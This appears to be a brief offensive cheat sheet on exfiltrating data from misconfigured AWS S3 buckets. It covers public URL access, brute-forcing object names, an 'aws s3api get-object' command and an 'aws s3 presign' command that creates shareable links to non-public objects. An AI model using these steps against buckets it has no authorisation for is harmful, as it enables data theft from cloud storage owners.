# AWS S3 Data Exfiltration

### It's possible to brute-force files in the bucket

### If the bucket is misconfigured, we can read data through web browser, cli/api or time-based URL.

# Public Access

### Just enter the URL in the browser

 - https://BUCKET-NAME.region.amazonaws.com/secret.txt

# Authenticated User

 - aws s3api get-object --bucket BUCKET_NAME --key OBJECT_NAME DOWNLOAD-FILE-LOCATION

# Time-Based URL

### Generate a time based url for an object

### Useful if the object is not public

 - aws s3 presign s3://BUCKET-NAME/OBJECT-NAME --expires-in 605000
